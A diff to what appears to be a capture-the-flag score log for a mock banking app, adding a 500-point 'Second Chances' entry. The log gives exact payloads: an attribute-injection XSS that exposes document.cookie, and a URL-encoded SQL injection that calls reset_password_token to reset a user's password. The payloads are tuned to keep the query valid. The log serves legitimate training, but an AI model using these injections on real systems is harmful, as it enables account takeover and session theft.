@@ -29,7 +29,9 @@
 | Between the Lines | Trex | 250 | HTML attribute injection via unescaped `"` in bill-pay memo — `$A()` renders `title="${memo}"` without escaping quotes; payload: `x" onmouseover="alert(document.cookie)` |
 | Honest Answers | Alpaca | 260 | SQLi — `GET /api/transactions?search='` causes DB 500 error; single quote breaks query syntax |
 
-**Total earned: 2420 pts**
+| Second Chances | Alpaca | 500 | SQLi to call `reset_password_token('pkapoor','Hacked123!')` via OR injection in `GET /api/transactions?search=` |
+
+**Total earned: 2920 pts**
 
 ---
 
@@ -46,6 +48,13 @@
 - Payload: `x" onmouseover="alert(document.cookie)` → creates `title="x" onmouseover="alert(document.cookie)"`
 - `POST /api/bill-pay/payments` with memo payload, then navigate to `/bill-pay/payments/{id}`
 - crwd-ctrl auto-detected when payment detail page loaded
+
+### Second Chances — 500 pts ✅
+- **Vulnerability:** SQL Injection → DB function call
+- **Exact request:** `GET /api/transactions?search=%25'%20OR%20reset_password_token('pkapoor','Hacked123!')%3E'a'%20OR%20'1'%3D'`
+- **Payload:** `%' OR reset_password_token('pkapoor','Hacked123!')>'a' OR '1'='`
+- **Why no `--`:** The `--` comment caused the UNION ALL from the template to remain in the SQL, generating bad grammar. Using `OR '1'='` to close the string instead keeps everything valid.
+- **Proof:** crwd-ctrl auto-detected (+500 pts), score now 2920
 
 ### Frozen Assets (Alpaca)
 - **Vector:** Bypass UI restriction to fund bill payment from frozen account
